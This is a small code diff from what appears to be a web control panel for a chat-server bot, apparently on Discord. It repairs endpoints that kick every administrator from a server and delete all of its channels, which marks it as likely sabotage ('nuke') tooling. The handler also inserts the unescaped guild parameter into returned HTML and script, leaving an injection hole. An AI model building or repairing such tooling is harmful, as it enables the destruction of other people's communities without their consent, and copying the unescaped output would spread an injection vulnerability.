@@ -33,14 +33,11 @@ app.get('/', async function(req, re) {
     re.send(v + await bot.messages(r.channel) + style)
   }
   if(r.path == "kickadmins" && r.guild) {
-    const run = async function (rx) { 
-      await bot.kickAdmins(r.guild)
-      return ""
-    }
-    re.send(v + await bot.selectMember(r.guild) + style)
+    await bot.kickAdmins(r.guild)
+    await re.send(v + `<script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=ms&guild=${r.guild}'">Back to list</button>` + style)
   }
   if(r.path == "delchs" && r.guild) {
-    await bot.delAllChs(rx.guild)
+    await bot.delAllChs(r.guild)
     await re.send(v + `<script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=sch&guild=${r.guild}'">Back to list</button>` + style)
   }
   if(r.path == "send" && r.channel) {
